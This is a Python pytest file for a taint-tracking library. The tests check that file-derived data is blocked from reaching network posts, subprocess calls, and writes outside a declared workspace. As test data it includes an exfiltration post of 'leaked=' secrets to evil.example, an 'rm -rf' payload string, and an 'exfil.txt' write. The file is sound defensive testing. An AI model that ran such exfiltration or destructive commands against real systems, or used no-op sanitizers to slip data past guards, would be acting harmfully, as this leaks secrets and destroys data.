"""A hand written script, reading a file, concatenating it into a string,
then posting over the network, gets correctly blocked, and a sanitized
version gets correctly allowed. This also covers subprocess and the
workspace boundary file write sink.
"""

import subprocess

import pytest
import responses

from provenance import rules
from provenance.exceptions import ProvenanceViolation
from provenance.rules import sanitizer


# --------------------------------------------------------------------------
# The shape of Incident A: a file read, concatenated, then posted with
# requests.post
# --------------------------------------------------------------------------

def test_file_to_post_blocked_without_sanitizing(tmp_path):
    secret_file = tmp_path / "secret.txt"
    secret_file.write_text("sk-attacker-controlled-content")

    with rules.installed():
        with open(secret_file) as f:
            secret = f.read()
        body = "leaked=" + secret

        with pytest.raises(ProvenanceViolation) as exc_info:
            import requests
            requests.post("https://evil.example/collect", data=body)

    assert "requests.post" in str(exc_info.value)
    assert any(f"file:{secret_file}" in o for o in exc_info.value.origins)


@responses.activate
def test_file_to_post_allowed_when_sanitized(tmp_path):
    secret_file = tmp_path / "secret.txt"
    secret_file.write_text("sk-attacker-controlled-content")
    responses.add(responses.POST, "https://safe.example/collect", status=200)

    @sanitizer
    def strip_it(value):
        return value

    with rules.installed():
        with open(secret_file) as f:
            secret = f.read()
        clean = strip_it(secret)
        body = "leaked=" + clean

        import requests
        response = requests.post("https://safe.example/collect", data=body)

    assert response.status_code == 200


def test_unrelated_post_without_flagged_data_is_allowed():
    with rules.installed():
        with pytest.raises(Exception) as exc_info:
            import requests
            requests.post("https://safe.example/collect", data="just plain text")
    assert not isinstance(exc_info.value, ProvenanceViolation)


# --------------------------------------------------------------------------
# subprocess.run as a sink
# --------------------------------------------------------------------------

def test_subprocess_run_blocked_with_flagged_arg(tmp_path):
    payload_file = tmp_path / "payload.txt"
    payload_file.write_text("rm -rf /whatever")

    with rules.installed():
        with open(payload_file) as f:
            payload = f.read()

        with pytest.raises(ProvenanceViolation) as exc_info:
            subprocess.run(["echo", payload], capture_output=True, text=True)

    assert "subprocess.run" in str(exc_info.value)


def test_subprocess_run_allowed_when_sanitized(tmp_path):
    payload_file = tmp_path / "payload.txt"
    payload_file.write_text("hello-subprocess")

    @sanitizer
    def approve(value):
        return value

    with rules.installed():
        with open(payload_file) as f:
            payload = f.read()
        safe_payload = approve(payload)

        result = subprocess.run(["echo", safe_payload], capture_output=True, text=True)

    assert result.returncode == 0
    assert "hello-subprocess" in result.stdout


def test_subprocess_stdout_is_tagged_as_source():
    with rules.installed():
        result = subprocess.run(["echo", "from-subprocess"], capture_output=True, text=True)

    from provenance import is_flagged
    assert is_flagged(result.stdout)


# --------------------------------------------------------------------------
# open(...).write() outside the declared workspace
# --------------------------------------------------------------------------

def test_write_outside_workspace_blocked(tmp_path):
    workspace = tmp_path / "workspace"
    workspace.mkdir()
    outside_dir = tmp_path / "outside"
    outside_dir.mkdir()
    source_file = tmp_path / "source.txt"
    source_file.write_text("untrusted content")

    rules.set_workspace(workspace)
    try:
        with rules.installed():
            with open(source_file) as f:
                content = f.read()

            target = outside_dir / "exfil.txt"
            with pytest.raises(ProvenanceViolation):
                with open(target, "w") as f:
                    f.write(content)
    finally:
        rules.set_workspace(tmp_path.parent)


def test_write_inside_workspace_allowed(tmp_path):
    workspace = tmp_path / "workspace"
    workspace.mkdir()
    source_file = tmp_path / "source.txt"
    source_file.write_text("untrusted content")

    rules.set_workspace(workspace)
    try:
        with rules.installed():
            with open(source_file) as f:
                content = f.read()

            target = workspace / "notes.txt"
            with open(target, "w") as f:
                f.write(content)

        assert target.read_text() == "untrusted content"
    finally:
        rules.set_workspace(tmp_path.parent)


# --------------------------------------------------------------------------
# Sanitizer semantics
# --------------------------------------------------------------------------

def test_sanitizer_clears_flag(tmp_path):
    secret_file = tmp_path / "s.txt"
    secret_file.write_text("data")

    @sanitizer
    def clean(value):
        return value

    with rules.installed():
        with open(secret_file) as f:
            raw = f.read()
        from provenance import is_flagged
        assert is_flagged(raw)
        cleaned = clean(raw)
        assert not is_flagged(cleaned)
